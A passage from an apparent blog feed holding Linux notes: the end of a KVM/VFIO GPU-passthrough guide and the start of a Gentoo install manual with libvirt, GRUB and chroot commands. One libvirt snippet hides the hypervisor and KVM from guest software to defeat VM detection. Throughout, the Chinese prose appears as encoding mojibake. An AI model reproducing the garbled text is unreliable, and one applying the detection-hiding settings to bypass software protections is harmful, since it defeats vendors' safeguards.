13 01:25 ..<br>-rwxr-xr-x 1 miloo libvirt  622  7æœˆ 14 23:32 qemu<br>-rwxr-xr-x 1 miloo libvirt 1981  7æœˆ 13 02:06 vfio-startup.sh<br>-rwxr-xr-x 1 miloo libvirt  972  7æœˆ 13 02:07 vfio-teardown.sh<br></code></pre></td></tr></table></figure><h2 id="2-5-QEMU-é…ç½®"><a href="#2-5-QEMU-é…ç½®" class="headerlink" title="2.5 QEMU é…ç½®"></a>2.5 QEMU é…ç½®</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># /etc/libvirt/libvirtd.conf ä¿®æ”¹å¦‚ä¸‹è¡Œï¼š</span><br>worisur /etc/libvirt <span class="hljs-comment"># cat libvirtd.conf</span><br>unix_sock_group = <span class="hljs-string">&quot;libvirt&quot;</span><br>unix_sock_rw_perms = <span class="hljs-string">&quot;0770&quot;</span><br>log_filters=<span class="hljs-string">&quot;1:qemu&quot;</span><br>log_outputs=<span class="hljs-string">&quot;1:file:/var/log/libvirt/libvirtd.log&quot;</span><br><br><span class="hljs-comment"># # /etc/libvirt/qemu.conf ä¿®æ”¹å¦‚ä¸‹è¡Œï¼š</span><br>worisur /etc/libvirt <span class="hljs-comment"># cat qemu.conf</span><br>user = <span class="hljs-string">&quot;miloo&quot;</span><br>group = <span class="hljs-string">&quot;libvirt&quot;</span><br></code></pre></td></tr></table></figure><h1 id="3-ç›´é€š"><a href="#3-ç›´é€š" class="headerlink" title="3 ç›´é€š"></a>3 ç›´é€š</h1><h2 id="3-1-åˆ›å»ºä¸ç›´é€šçš„è™šæ‹Ÿæœº"><a href="#3-1-åˆ›å»ºä¸ç›´é€šçš„è™šæ‹Ÿæœº" class="headerlink" title="3.1 åˆ›å»ºä¸ç›´é€šçš„è™šæ‹Ÿæœº"></a>3.1 åˆ›å»ºä¸ç›´é€šçš„è™šæ‹Ÿæœº</h2><ul><li>ä¸‹è½½<a href="https://github.com/virtio-win/virtio-win-pkg-scripts/blob/master/README.md">é©±åŠ¨</a></li><li>èŠ¯ç‰‡ç»„ï¼šQ35</li><li>å›ºä»¶ï¼šovmf_code.fd</li></ul><h2 id="3-2-vbios"><a href="#3-2-vbios" class="headerlink" title="3.2 vbios"></a>3.2 vbios</h2><p><a href="http://www.xiaobaixitong.com/help/43692.html">gpuzæå–</a></p><p><a href="https://www.techpowerup.com/vgabios/?architecture=&manufacturer=&model=RX+6800+XT&interface=&memType=&memSize=&since=">æ­¤å¤„ä¸‹è½½</a></p><h2 id="3-3-æ·»åŠ ç›´é€šè®¾å¤‡"><a href="#3-3-æ·»åŠ ç›´é€šè®¾å¤‡" class="headerlink" title="3.3 æ·»åŠ ç›´é€šè®¾å¤‡"></a>3.3 æ·»åŠ ç›´é€šè®¾å¤‡</h2><ol><li>æ‰“å¼€è™šæ‹Ÿæœºç®¡ç†å™¨,æŠŠæ˜¾å¡çš„æ‰€æœ‰pciéƒ¨åˆ†éƒ½æ·»åŠ åˆ°è™šæ‹Ÿæœºé‡Œé¢ã€‚<blockquote><p>pciè®¾å¤‡ï¼š1002:73bf,1002:ab28,1002:73a6,1002:73a4,1002:1478,1002:1479</p></blockquote></li><li>å¯ç”¨XMLç¼–è¾‘, åœ¨æ˜¾å¡çš„æ‰€æœ‰pciè®¾å¤‡é‡Œé¢, åœ¨</source>ä¹‹åæ·»åŠ : <code>&lt;rom bar=&quot;on&quot; file=&quot;vbiosè·¯å¾„&quot;/&gt;</code></li><li>æŠŠä¸²å£,æ˜¾ç¤ºåè®®,ä¿¡é“,usbè½¬æ¥,æ˜¾å¡qxl,è§¦æ‘¸æ¿é‚£äº›ä¸œè¥¿åˆ æ‰</li><li>æ·»åŠ ä½ çš„USBè®¾å¤‡,æ¯”å¦‚é¼ æ ‡ã€é”®ç›˜å’ŒUSBè€³æœºã€‚</li></ol><h1 id="4-é—®é¢˜è§£å†³"><a href="#4-é—®é¢˜è§£å†³" class="headerlink" title="4 é—®é¢˜è§£å†³"></a>4 é—®é¢˜è§£å†³</h1><h2 id="4-1-è½¯ä»¶ä¸èƒ½è¿è¡Œåœ¨è™šæ‹Ÿæœºä¸Š-Sorry-this-program-cannot-run-under-a-virtual-machine"><a href="#4-1-è½¯ä»¶ä¸èƒ½è¿è¡Œåœ¨è™šæ‹Ÿæœºä¸Š-Sorry-this-program-cannot-run-under-a-virtual-machine" class="headerlink" title="4.1 è½¯ä»¶ä¸èƒ½è¿è¡Œåœ¨è™šæ‹Ÿæœºä¸Š(Sorry, this program cannot run under a virtual machine)"></a>4.1 è½¯ä»¶ä¸èƒ½è¿è¡Œåœ¨è™šæ‹Ÿæœºä¸Š(Sorry, this program cannot run under a virtual machine)</h2><ul><li>Pass the SMBIOS information to the guest</li><li>Pass the exact hostâ€™s CPU model to the guest</li><li>Hide the â€œhypervisorâ€ feature from the CPU</li><li>In the â€œfeatures &gt; hypervâ€ section, add a vendor_id</li><li>In the â€œfeaturesâ€ section, hide kvm.</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">os</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">smbios</span> <span class="hljs-attr">mode</span>=<span class="hljs-string">&#x27;host&#x27;</span>/&gt;</span><br>  ...<br><span class="hljs-tag">&lt;/<span class="hljs-name">os</span>&gt;</span><br>...<br><span class="hljs-tag">&lt;<span class="hljs-name">features</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">hyperv</span>&gt;</span><br>    ...<br>    <span class="hljs-tag">&lt;<span class="hljs-name">vendor_id</span> <span class="hljs-attr">state</span>=<span class="hljs-string">&#x27;on&#x27;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#x27;123456789ab&#x27;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">hyperv</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">kvm</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">hidden</span> <span class="hljs-attr">state</span>=<span class="hljs-string">&#x27;on&#x27;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">hint-dedicated</span> <span class="hljs-attr">state</span>=<span class="hljs-string">&#x27;on&#x27;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">kvm</span>&gt;</span><br>  ...<br><span class="hljs-tag">&lt;/<span class="hljs-name">features</span>&gt;</span><br>...<br><span class="hljs-tag">&lt;<span class="hljs-name">cpu</span> <span class="hljs-attr">mode</span>=<span class="hljs-string">&#x27;host-passthrough&#x27;</span>&gt;</span><br>  ...<br>  <span class="hljs-tag">&lt;<span class="hljs-name">feature</span> <span class="hljs-attr">policy</span>=<span class="hljs-string">&#x27;disable&#x27;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;hypervisor&#x27;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">cpu</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="4-2-é»‘å±-ucsi-cgg-1-0008-ucsi-handle-connector-change-GET-CONNECTOR-STATUS-failed"><a href="#4-2-é»‘å±-ucsi-cgg-1-0008-ucsi-handle-connector-change-GET-CONNECTOR-STATUS-failed" class="headerlink" title="4.2 é»‘å±(ucsi_cgg 1-0008: ucsi_handle_connector_change: GET_CONNECTOR_STATUS failed)"></a>4.2 é»‘å±(ucsi_cgg 1-0008: ucsi_handle_connector_change: GET_CONNECTOR_STATUS failed)</h2><ul><li><code>ucsi_cgg</code> ä¸ºè‹±ä¼Ÿè¾¾æ˜¾å¡çš„ <code>mod</code> ç›´æ¥å±è”½å°±å¥½</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">/etc/modprobe.d <span class="hljs-comment"># cat blacklist-nvidia-usb.conf</span><br>blacklist ucsi_ccg<br></code></pre></td></tr></table></figure><h2 id="4-2-docker-æ¡¥æ¥å ç”¨ç‰©ç†ç½‘å¡å¯¼è‡´ç½‘ç»œä¸é€šçš„æƒ…å†µ"><a href="#4-2-docker-æ¡¥æ¥å ç”¨ç‰©ç†ç½‘å¡å¯¼è‡´ç½‘ç»œä¸é€šçš„æƒ…å†µ" class="headerlink" title="4.2 docker æ¡¥æ¥å ç”¨ç‰©ç†ç½‘å¡å¯¼è‡´ç½‘ç»œä¸é€šçš„æƒ…å†µ"></a>4.2 docker æ¡¥æ¥å ç”¨ç‰©ç†ç½‘å¡å¯¼è‡´ç½‘ç»œä¸é€šçš„æƒ…å†µ</h2><ul><li>æ·»åŠ æˆ–ä¿®æ”¹ <code>/etc/docker/daemon.json</code> å°† kvm çš„æ¡¥æ¥ç½‘å¡ç›´æ¥èµ‹ç»™ docker</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123;<br>  <span class="hljs-string">&quot;bridge&quot;</span>: <span class="hljs-string">&quot;virbr&quot;</span>,<br>  <span class="hljs-string">&quot;default-gateway&quot;</span>: <span class="hljs-string">&quot;*.*.*.*&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
      <category>kvm</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>kvm</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Gentoo é…ç½®æ‰‹å†Œ</title>
    <link href="/2022/07/04/2022-07-04.gentoo%E9%85%8D%E7%BD%AE%E6%89%8B%E5%86%8C/"/>
    <url>/2022/07/04/2022-07-04.gentoo%E9%85%8D%E7%BD%AE%E6%89%8B%E5%86%8C/</url>
    
    <content type="html"><![CDATA[<ul><li><a href="#1-%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C">1 å‡†å¤‡å·¥ä½œ</a><ul><li><a href="#11-%E4%B8%8B%E8%BD%BD">1.1 ä¸‹è½½</a></li><li><a href="#12-%E7%BD%91%E7%BB%9C">1.2 ç½‘ç»œ</a></li><li><a href="#13-%E5%88%86%E5%8C%BA%E6%8C%82%E8%BD%BD">1.3 åˆ†åŒºæŒ‚è½½</a></li><li><a href="#14-ssh%E8%BF%9E%E6%8E%A5%E6%9C%80%E5%B0%8F%E5%8C%96%E5%AE%89%E8%A3%85%E7%B3%BB%E7%BB%9F">1.4 sshè¿æ¥æœ€å°åŒ–å®‰è£…ç³»ç»Ÿ</a></li></ul></li><li><a href="#2-%E5%AE%89%E8%A3%85">2 å®‰è£…</a><ul><li><a href="#21-%E8%A7%A3%E5%8E%8B%E5%9F%BA%E6%9C%AC%E7%B3%BB%E7%BB%9F">2.1 è§£å‹åŸºæœ¬ç³»ç»Ÿ</a></li><li><a href="#22-%E9%95%9C%E5%83%8F%E6%BA%90%E4%B8%8Echroot">2.2 é•œåƒæºä¸chroot</a></li><li><a href="#23-portage%E4%BB%93%E5%BA%93">2.3 portageä»“åº“</a></li><li><a href="#24-profile%E9%80%89%E6%8B%A9">2.4 profileé€‰æ‹©</a></li><li><a href="#25-%E5%AE%89%E8%A3%85%E5%86%85%E6%A0%B8%E5%9B%BA%E4%BB%B6">2.5 å®‰è£…å†…æ ¸ã€å›ºä»¶</a></li><li><a href="#26-%E9%85%8D%E7%BD%AE%E5%BC%95%E5%AF%BC">2.6 é…ç½®å¼•å¯¼</a></li><li><a href="#27-%E6%97%B6%E5%8C%BA%E5%AD%97%E7%AC%A6%E9%9B%86%E9%85%8D%E7%BD%AE">2.7 æ—¶åŒºã€å­—ç¬¦é›†é…ç½®</a></li><li><a href="#28-virtualbox-%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%85%8D%E7%BD%AE">2.8 virtualbox è™šæ‹Ÿæœºé…ç½®</a></li></ul></li><li><a href="#3-use">3 USE</a><ul><li><a href="#31-makeconf">3.1 make.conf</a></li><li><a href="#32-use">3.2 USE</a></li></ul></li><li><a href="#4-tools">4 tools</a><ul><li><a href="#41-%E5%8C%85%E7%AE%A1%E7%90%86">4.1 åŒ…ç®¡ç†</a><ul><li><a href="#411-app-portageeix">4.1.1 app-portage&#x2F;eix</a></li></ul></li><li><a href="#42-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F">4.2 æ–‡ä»¶ç³»ç»Ÿ</a><ul><li><a href="#421-sys-fslvm2">4.2.1 sys-fs&#x2F;lvm2</a></li><li><a href="#422-ntfs">4.2.2 ntfs</a></li></ul></li><li><a href="#43-de">4.3 DE</a><ul><li><a href="#431-gnome">4.3.1 gnome</a></li></ul></li><li><a href="#44-vitual">4.4 vitual</a><ul><li><a href="#441-virtualbox">4.4.1 virtualbox</a></li><li><a href="#442-kvm">4.4.2 kvm</a></li></ul></li></ul></li><li><a href="#5-%E7%B3%BB%E7%BB%9F%E8%BF%81%E7%A7%BB">5 ç³»ç»Ÿè¿ç§»</a><ul><li><a href="#51-%E6%9D%83%E9%99%90%E5%A4%87%E4%BB%BD%E4%B8%8E%E6%81%A2%E5%A4%8D">5.1 æƒé™å¤‡ä»½ä¸æ¢å¤</a></li><li><a href="#52-%E7%94%A8%E6%88%B7%E7%BB%84">5.2 ç”¨æˆ·ç»„</a></li></ul></li></ul><h1 id="1-å‡†å¤‡å·¥ä½œ"><a href="#1-å‡†å¤‡å·¥ä½œ" class="headerlink" title="1 å‡†å¤‡å·¥ä½œ"></a>1 å‡†å¤‡å·¥ä½œ</h1><h2 id="1-1-ä¸‹è½½"><a href="#1-1-ä¸‹è½½" class="headerlink" title="1.1 ä¸‹è½½"></a>1.1 ä¸‹è½½</h2><ul><li><p>ä¸‹è½½<a href="https://mirrors.bfsu.edu.cn/gentoo/releases/amd64/autobuilds/current-install-amd64-minimal/">æœ€å°åŒ–å®‰è£…é•œåƒ</a>, åç§°ä¸º: <code>install-amd64-minimal-&#123;æ—¥æœŸ&#125;.iso</code>  </p></li><li><p>ä¸‹è½½<a href="https://mirrors.bfsu.edu.cn/gentoo/releases/amd64/autobuilds/">åˆé€‚çš„stage3</a>,ä»¥æ—¥æœŸä¸ºè·¯å¾„: <code>20220703T170542Z/stage3-amd64-desktop-systemd-20220703T170542Z.tar.xz</code></p></li></ul><h2 id="1-2-ç½‘ç»œ"><a href="#1-2-ç½‘ç»œ" class="headerlink" title="1.2 ç½‘ç»œ"></a>1.2 ç½‘ç»œ</h2><p>åŸºæ“å¿½ç•¥</p><h2 id="1-3-åˆ†åŒºæŒ‚è½½"><a href="#1-3-åˆ†åŒºæŒ‚è½½" class="headerlink" title="1.3 åˆ†åŒºæŒ‚è½½"></a>1.3 åˆ†åŒºæŒ‚è½½</h2><p>åŸºæ“å¿½ç•¥</p><h2 id="1-4-sshè¿æ¥æœ€å°åŒ–å®‰è£…ç³»ç»Ÿ"><a href="#1-4-sshè¿æ¥æœ€å°åŒ–å®‰è£…ç³»ç»Ÿ" class="headerlink" title="1.4 sshè¿æ¥æœ€å°åŒ–å®‰è£…ç³»ç»Ÿ"></a>1.4 sshè¿æ¥æœ€å°åŒ–å®‰è£…ç³»ç»Ÿ</h2><p>ç¼–è¾‘ <code>sshd</code> æœåŠ¡é…ç½®æ–‡ä»¶ <code>/etc/ssh/sshd_config</code>, é‡å¯æœåŠ¡ <code>rc-server sshd restart</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">PermitRootLogin <span class="hljs-built_in">yes</span><br>PasswordAuthentication <span class="hljs-built_in">yes</span><br></code></pre></td></tr></table></figure><h1 id="2-å®‰è£…"><a href="#2-å®‰è£…" class="headerlink" title="2 å®‰è£…"></a>2 å®‰è£…</h1><h2 id="2-1-è§£å‹åŸºæœ¬ç³»ç»Ÿ"><a href="#2-1-è§£å‹åŸºæœ¬ç³»ç»Ÿ" class="headerlink" title="2.1 è§£å‹åŸºæœ¬ç³»ç»Ÿ"></a>2.1 è§£å‹åŸºæœ¬ç³»ç»Ÿ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">livecd ~ <span class="hljs-comment"># blkid</span><br>/dev/sdb: UUID=<span class="hljs-string">&quot;e09609d8-0b90-4f34-aad1-8e5b37495f52&quot;</span> BLOCK_SIZE=<span class="hljs-string">&quot;4096&quot;</span> TYPE=<span class="hljs-string">&quot;ext4&quot;</span><br>/dev/sr0: BLOCK_SIZE=<span class="hljs-string">&quot;2048&quot;</span> UUID=<span class="hljs-string">&quot;2022-07-03-19-01-40-00&quot;</span> LABEL=<span class="hljs-string">&quot;Gentoo amd64 20220703T170542Z&quot;</span> TYPE=<span class="hljs-string">&quot;iso9660&quot;</span> PTUUID=<span class="hljs-string">&quot;5e426e6b&quot;</span> PTTYPE=<span class="hljs-string">&quot;dos&quot;</span><br>loop0: TYPE=<span class="hljs-string">&quot;squashfs&quot;</span><br>/dev/sda2: UUID=<span class="hljs-string">&quot;14077ead-3683-4354-95eb-a106c52350e9&quot;</span> BLOCK_SIZE=<span class="hljs-string">&quot;4096&quot;</span> TYPE=<span class="hljs-string">&quot;ext4&quot;</span> PARTUUID=<span class="hljs-string">&quot;4af31142-0ead-0644-b34c-c01b7c0944e1&quot;</span><br>/dev/sda1: UUID=<span class="hljs-string">&quot;831A-6EDD&quot;</span> BLOCK_SIZE=<span class="hljs-string">&quot;512&quot;</span> TYPE=<span class="hljs-string">&quot;vfat&quot;</span> PARTUUID=<span class="hljs-string">&quot;733a54ad-b3d7-3842-8cc8-21b15d29e82d&quot;</span><br>livecd ~ <span class="hljs-comment"># mount /dev/sda2 /mnt/gentoo/</span><br>livecd ~ <span class="hljs-comment"># mkdir /mnt/gentoo/boot</span><br>livecd ~ <span class="hljs-comment"># mount /dev/sda1 /mnt/gentoo/boot</span><br>livecd ~ <span class="hljs-comment"># cd /mnt/gentoo/</span><br>livecd /mnt/gentoo <span class="hljs-comment"># ls</span><br>boot  lost+found<br>livecd /mnt/gentoo <span class="hljs-comment"># wget https://mirrors.bfsu.edu.cn/gentoo/releases/amd64/autobuilds/20220703T170542Z/stage3-amd64-desktop-systemd-20220703T170542Z.tar.xz</span><br>--2022-07-05 08:09:54--  https://mirrors.bfsu.edu.cn/gentoo/releases/amd64/autobuilds/20220703T170542Z/stage3-amd64-desktop-systemd-20220703T170542Z.tar.xz  <br>Resolving mirrors.bfsu.edu.cn... 39.155.141.16, 2001:da8:20f:1003::fe55:2840<br>Connecting to mirrors.bfsu.edu.cn|39.155.141.16|:443... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 516402028 (492M) [application/octet-stream]<br>Saving to: â€˜stage3-amd64-desktop-systemd-20220703T170542Z.tar.xzâ€™<br>stage3-amd64-desktop-systemd- 100%[=================================================&gt;] 492.48M  11.3MB/s    <span class="hljs-keyword">in</span> 46s<br>2022-07-05 08:10:40 (10.6 MB/s) - â€˜stage3-amd64-desktop-systemd-20220703T170542Z.tar.xzâ€™ saved [516402028/516402028]<br>livecd /mnt/gentoo <span class="hljs-comment"># tar xpvf stage3-amd64-desktop-systemd-20220703T170542Z.tar.xz --xattrs-include=&#x27;*.*&#x27; --numeric-owner</span><br>â€¦â€¦<br></code></pre></td></tr></table></figure><h2 id="2-2-é•œåƒæºä¸chroot"><a href="#2-2-é•œåƒæºä¸chroot" class="headerlink" title="2.2 é•œåƒæºä¸chroot"></a>2.2 é•œåƒæºä¸chroot</h2><p>é…ç½®ä¸€ä¸ªé€Ÿåº¦è¾ƒå¿«çš„é•œåƒæºæœåŠ¡å™¨åœ°å€</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">mirrorselect -i -o &gt;&gt;/mnt/gentoo/etc/portage/make.conf  <span class="hljs-comment"># é€‰æ‹©163å’Œæ¸…åå¤§å­¦æº</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;GENTOO_MIRRORS=&quot;https://mirrors.tuna.tsinghua.edu.cn/gentoo&quot;&#x27;</span> &gt;&gt;/mnt/gentoo/etc/portage/make.conf<br><span class="hljs-comment"># chroot åˆ°ç›®æ ‡ç³»ç»Ÿ</span><br><span class="hljs-comment"># å¤åˆ¶ DNS é…ç½®åˆ°ç›®æ ‡ç³»ç»Ÿç¯å¢ƒ</span><br><span class="hljs-built_in">cp</span> -L /etc/resolv.conf /mnt/gentoo/etc/<br><span class="hljs-comment"># æŒ‚è½½å¿…è¦çš„æ–‡ä»¶ç³»ç»Ÿ</span><br>mount --types proc /proc /mnt/gentoo/proc<br>mount --rbind /sys /mnt/gentoo/sys<br>mount --rbind /dev /mnt/gentoo/dev<br><span class="hljs-comment"># systemd stage3 é¢å¤–æ‰§è¡Œ</span><br>mount --make-rslave /mnt/gentoo/sys<br>mount --make-rslave /mnt/gentoo/dev<br><span class="hljs-comment"># chroot åˆ°ç›®æ ‡ç³»ç»Ÿç¯å¢ƒ</span><br><span class="hljs-built_in">chroot</span> /mnt/gentoo<br><span class="hljs-comment"># å¯¼å…¥ç¯å¢ƒä¿¡æ¯</span><br>. /etc/profile<br><span class="hljs-comment"># ä¿®æ”¹æç¤ºç¬¦ä»¥ä¾¿äºåŒºåˆ†</span><br>PS1=(<span class="hljs-built_in">chroot</span>)<span class="hljs-variable">$PS1</span><br></code></pre></td></tr></table></figure><h2 id="2-3-portageä»“åº“"><a href="#2-3-portageä»“åº“" class="headerlink" title="2.3 portageä»“åº“"></a>2.3 portageä»“åº“</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ä»“åº“ä¿¡æ¯æ‰“åŒ…ä¸‹è½½åˆ°æœ¬åœ°</span><br>emerge-webrsync<br><span class="hljs-comment"># å®‰è£… vim</span><br>emerge --ask app-editors/vim<br></code></pre></td></tr></table></figure><h2 id="2-4-profileé€‰æ‹©"><a href="#2-4-profileé€‰æ‹©" class="headerlink" title="2.4 profileé€‰æ‹©"></a>2.4 profileé€‰æ‹©</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">(<span class="hljs-built_in">chroot</span>)livecd / <span class="hljs-comment"># eselect profile list</span><br>(<span class="hljs-built_in">chroot</span>)livecd / <span class="hljs-comment"># eselect profile set 7</span><br>(<span class="hljs-built_in">chroot</span>)livecd / <span class="hljs-comment"># emerge --ask --verbose --update --deep --newuse @world</span><br></code></pre></td></tr></table></figure><h2 id="2-5-å®‰è£…å†…æ ¸ã€å›ºä»¶"><a href="#2-5-å®‰è£…å†…æ ¸ã€å›ºä»¶" class="headerlink" title="2.5 å®‰è£…å†…æ ¸ã€å›ºä»¶"></a>2.5 å®‰è£…å†…æ ¸ã€å›ºä»¶</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">(<span class="hljs-built_in">chroot</span>)livecd / <span class="hljs-comment"># emerge --ask gentoo-kernel  </span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">(<span class="hljs-built_in">chroot</span>)livecd / <span class="hljs-comment"># emerge --ask linux-firmware</span><br><br></code></pre></td></tr></table></figure><h2 id="2-6-é…ç½®å¼•å¯¼"><a href="#2-6-é…ç½®å¼•å¯¼" class="headerlink" title="2.6 é…ç½®å¼•å¯¼"></a>2.6 é…ç½®å¼•å¯¼</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">(<span class="hljs-built_in">chroot</span>)livecd / <span class="hljs-comment"># emerge --ask grub</span><br>(<span class="hljs-built_in">chroot</span>)livecd / <span class="hljs-comment"># grub-install --target=x86_64-efi --efi-directory=/boot --bootloader-id=Gentoo</span><br>Installing <span class="hljs-keyword">for</span> x86_64-efi platform.<br>Installation finished. No error reported.<br>(<span class="hljs-built_in">chroot</span>)livecd / <span class="hljs-comment"># grub-install --target=x86_64-efi --efi-directory=/boot --removable</span><br>Installing <span class="hljs-keyword">for</span> x86_64-efi platform.<br>Installation finished. No error reported.  <br>(<span class="hljs-built_in">chroot</span>)livecd / <span class="hljs-comment"># grub-mkconfig -o /boot/grub/grub.cfg</span><br>Generating grub configuration file ...<br>Found linux image: /boot/vmlinuz-5.15.48-gentoo-dist<br>Found initrd image: /boot/initramfs-5.15.48-gentoo-dist.img<br>Warning: os-prober will not be executed to detect other bootable partitions.<br>Systems on them will not be added to the GRUB boot configuration.<br>Check GRUB_DISABLE_OS_PROBER documentation entry.<br>Adding boot menu entry <span class="hljs-keyword">for</span> UEFI Firmware Settings ...<br><span class="hljs-keyword">done</span>        <br></code></pre></td></tr></table></figure><h2 id="2-7-æ—¶åŒºã€å­—ç¬¦é›†é…ç½®"><a href="#2-7-æ—¶åŒºã€å­—ç¬¦é›†é…ç½®" class="headerlink" title="2.7 æ—¶åŒºã€å­—ç¬¦é›†é…ç½®"></a>2.7 æ—¶åŒºã€å­—ç¬¦é›†é…ç½®</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;Asia/Shanghai&#x27;</span> &gt; /etc/timezone<br><span class="hljs-built_in">rm</span> /etc/localtime<br>emerge --config sys-libs/timezone-data<br>vim /etc/locale.gen<br>locale-gen<br><br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/zero of=/swapfile bs=1M count=8192 status=progress<br><span class="hljs-built_in">chmod</span> 600 /swapfile<br>mkswap /swapfile<br>swapon /swapfile<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/swapfile               none    swap    defaults        0 0&quot;</span> &gt;&gt; /etc/fstab<br></code></pre></td></tr></table></figure><h2 id="2-8-virtualbox-è™šæ‹Ÿæœºé…ç½®"><a href="#2-8-virtualbox-è™šæ‹Ÿæœºé…ç½®" class="headerlink" title="2.8 virtualbox è™šæ‹Ÿæœºé…ç½®"></a>2.8 virtualbox è™šæ‹Ÿæœºé…ç½®</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># æ–°å»ºç”¨æˆ·</span><br>useradd -m -g wheel -G usb,<span class="hljs-built_in">users</span>,audio -s /bin/bash -N miloo<br><br><span class="hljs-comment"># å¦‚æœæ˜¯è™šæ‹Ÿæœºéœ€è¦æ·»åŠ åˆ°ä»¥ä¸‹ä¸¤ä¸ªç»„</span><br>gpasswd -a miloo vboxguest<br>gpasswd -a miloo vboxsf<br><br><span class="hljs-comment"># virtualbox è™šæ‹Ÿæœºå®‰è£…åæ“ä½œ</span><br>emerge --ask app-emulation/virtualbox-guest-additions<br>systemctl <span class="hljs-built_in">enable</span> --now virtualbox-guest-additions<br></code></pre></td></tr></table></figure><h1 id="3-USE"><a href="#3-USE" class="headerlink" 